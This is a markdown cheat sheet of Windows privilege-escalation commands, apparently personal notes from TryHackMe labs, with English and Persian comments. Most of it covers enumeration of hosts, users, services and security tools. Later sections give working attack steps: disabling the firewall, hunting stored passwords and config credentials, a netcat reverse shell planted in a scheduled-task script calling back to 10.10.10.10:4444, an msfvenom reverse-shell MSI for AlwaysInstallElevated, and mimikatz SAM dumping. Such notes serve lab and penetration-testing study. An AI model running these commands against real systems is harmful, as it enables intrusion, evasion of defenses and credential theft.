# Enumeration ✅📚
[Windows/Linux-Privilege-Escalation-Workshop](https://github.com/sagishahar/lpeworkshop)

[Windows-Privilege-Escalation-PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

[windows-privilege-escalation-hacktricks](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html?highlight=Windows-Privilege#windows-local-privilege-escalation)

https://tryhackme.com/room/winprivesc

https://tryhackme.com/room/windowsprivesc20

https://tryhackme.com/room/windows10privesc

https://tryhackme.com/room/windows10privescgn

https://tryhackme.com/room/windowsprivescarena

## Basic-Enumeration ✅
```powershell
hostname
systeminfo        # System and Windows Information Like Hotfix(s)
wmic os get Caption, Version, OSArchitecture # اطلاعات سیستم و ویندوز
driverquery # Check the drivers
--------------------------------------------------------------------------
# Sharing files and Printers Enumeration
net share
net view \\TARGET-IP 
net use Z: \\TARGET-IP\SharedFolder
--------------------------------------------------------------------------
# User-Enumeration
whoami 
whoami /priv      # بررسی سطح دسترسی
whoami /groups
qwinsta # View users who are login at the same time
query session # View users who are login at the same time
--------------------------------------------------------------------------
# Check password policy,  minimum password length, maximum password age, and lockout duration.
net accounts # Check the system settings  
net accounts /domain # Checking the system settings belongs to a domain
--------------------------------------------------------------------------
net user # List of system usernames
net user Administrator # Check the details of a particular user
net group # List of system Windows Domain Controller group
net localgroup # List of system local system group
net localgroup administrators  #  list the users that belong to the local administrators group
Get-ADUser -Filter * # Find users in Active Directory
Get-ADUser -Filter * -SearchBase "DC=THMREDTEAM,DC=COM" # Find all users in a particular DC (Domain Component)
Get-ADUser -Filter * -SearchBase "CN=Users,DC=THMREDTEAM,DC=COM" # Search users in a particular CN (Common Name)
Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREDTEAM,DC=COM" # Find all users in a particular OU (Organizational Unit)
--------------------------------------------------------------------------
# Network-Enumeration
arp -a     # برسی جدول آرپ برای شناسایی دستگاه‌های دیگری که در شبکه فعال هستند
ipconfig /all     # بررسی اطلاعات شبکه
netstat -anot      # بررسی پورت‌های باز و اتصالات شبکه
netstat -ano | findstr :3366  # بررسی باز بودن یا نبودن یک پورت خاص 
dig -t AXFR redteam.thm @10.10.73.142
dig -t CNAME redteam.thm @10.10.73.142
dig -t DNSSEC redteam.thm @10.10.73.142
--------------------------------------------------------------------------
# These tools are for gathering information and abusing common mistakes in Windows security configurations.
https://github.com/GhostPack/Seatbelt
https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
https://github.com/PowerShellMafia/PowerSploit
```

## Host-Security-Enumeration ✅
```powershell
# Antivirus
sc query windefend
wmic /namespace:\\root\securitycenter2 path antivirusproduct # Antivirus Identification Method
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct # Antivirus Identification Method
Get-Service WinDefend # Check Windows Defender's status
Get-MpComputerStatus | select RealTimeProtectionEnabled # Check Windows Defender's (Real-time Protection) status
Get-MpThreat # View threats identified by Microsoft Defender
--------------------------------------------------------------------------
# Firewall
Get-NetFirewallProfile | Format-Table Name, Enabled # Checking the Firewall Status 
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False # If we have admin access, we can disable the firewall on profiles
Get-NetFirewallRule | select DisplayName, Enabled, Description # Checking the firewall rules
Get-NetFirewallRule | select DisplayName, Enabled, Description # Check of specific firewall rules

netsh firewall show state # Checking the Firewall Status
netsh advfirewall firewall show rule name=all # Checking the firewall rules
netsh advfirewall set allprofiles state off # Disable firewall in all profiles
netsh advfirewall firewall show rule name=all | findstr /i "3366" # Checking a particular port in the firewall rules

(New-Object System.Net.Sockets.TcpClient("127.0.0.1", "445")).Connected # Check whether a particular port is open in firewall rules or not
Test-NetConnection -ComputerName 127.0.0.1 -Port 445  # Check whether a particular port is open in firewall rules or not
$portRange = 80..90; $portRange | ForEach-Object { Test-NetConnection -ComputerName 127.0.0.1 -Port $_ } # Check whether a particular range ports are open in firewall rules or not
--------------------------------------------------------------------------
# Log
Get-EventLog -List # Check the list of logs in the system
Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }  # Checking SysMon Installation on System
Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"  # Checking SysMon Installation on System
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational  # Checking SysMon Installation on System
----------------------------------------------------------------
# If the hacker can access the Sysmon configuration file, he can find out what activities are being monitored and trying to erase his rejection!
findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\* 
----------------------------------------------------------------
wmic qfe get Caption,Description,HotFixID,InstalledOn # Checking the system update level and Check installed security patch
----------------------------------------------------------------
# Check what are security software such as antivirus, EDR, or monitoring runs on the system with External tools
https://github.com/PwnDexter/Invoke-EDRChecker
https://github.com/PwnDexter/SharpEDRChecker
```

## Windows-Applications/Services-Enumeration ✅
```cmd
net start # لیست کردن سرویس‌های فعال در سیستم
wmic service where "name like 'THM Demo'" get Name,PathName #  پیدا کردن مسیر فایل اجرایی سرویس خاص
Get-Process -Name thm-demo # Checking Process activities associated with this service
# Note: Process ID (PID) This is useful for the next steps.

wmic product get name,version,vendor # چک کردن لیست همه‌ی نرم‌افزارهای نصب‌شده همراه با نسخه‌شون
wmic service get name,displayname,pathname,startmode # Unquoted Service Path

tasklist          # لیست پردازش‌های فعال
tasklist | findstr <PID> 
wmic process list full  # نمایش تمام جزئیات پردازش‌ها
Get-ChildItem -Hidden -Path C:\Users\Public\  # لیست فایل‌های مخفی

sc queryex type=service # List of all running services
sc qc apphostsvc # برسی جزئیات پیکربندی یک سرویس خاص
Get-SmbServerConfiguration # Check the SMB version running on a Windows system (in the internal network)
----------------------------------------------------------------
# Check DNS service (to analyze domain name on the network) 
> nslookup.exe # run tool
> server <IP-Dns-Server> # Set dns server
> ls -d thmredteam.com # Check Zone Transfer (if the server is not configured correctly, the domain information can be extracted)
----------------------------------------------------------------
# Check through the Windows Registry
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services /s /f "ImagePath"
```

# Credentials ✅
## File-Unattended ✅
```cmd
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
### cmd ✡️
```powershell
dir C:\sysprep.inf /s /p
dir C:\sysprep.xml /s /p
dir C:\unattend.xml /s /p
dir C:\Users\*\.ssh\ # Check SSH keys

findstr /si password *.txt
type C:\Users\Administrator\Desktop\passwords.txt

Get-ChildItem -Path C:\ -Filter "sysprep.inf" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Filter "Unattend.xml" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Windows\Panther\ -Filter "*.xml" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Windows\system32\sysprep\ -Filter "*.xml" -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users -Recurse -Force | Select-String -Pattern "password|passwd|credentials|login" # Password hunting and sensitive information

```
## Powershell History ✅
### cmd ✡️
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # run in cmd
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # run in powershell
```
## Saved Windows Credentials ✅
```powershell
cmdkey /list # show save user credentials
runas /savecred /user:<username> cmd.exe # run cmd with another user 
runas /savecred /user:<username> powershell.exe # run powershell with another user
```
## IIS Configuration ✅
```cmd
type C:\inetpub\wwwroot\web.config | findstr connectionString
forfiles /p C:\ /s /m web.config /c "cmd /c findstr /i connectionString @file" 2>$null
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
## Retrieve Credentials from Software: PuTTY ✅
```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
# Abusing Service Misconfigurations ✅
## Scheduled Tasks ✅
```cmd
schtasks /query /fo LIST /v
schtasks /query /tn vulntask /fo list /v  # target system
------------------------------
icacls c:\tasks\schtask.bat # check the file permissions in target system 
------------------------------
echo c:\tools\nc64.exe -e cmd.exe 10.10.10.10 4444 > C:\tasks\schtask.bat # target system
------------------------------
nc -lvnp 4444 # our kali
------------------------------
schtasks /run /tn vulntask # target system
```
## AlwaysInstallElevated ✅
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
------------------------------
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o malicious.msi # our kali
# transfer malicious.msi file to our kali # target system
------------------------------
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi # target system
```

## Strart-Powershell-With-Admin ✅
```powershell
Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
```

## Mimikatz-Command ✅
```powershell
privilege::debug # this obtains debug privileges which (without going into too much depth in the Windows privilege structure) allows us to access other processes for "debugging" purposes.
token::elevate # simply put, this takes us from our administrative shell with high privileges into a SYSTEM level shell with maximum privileges
lsadump::sam # list of password
```
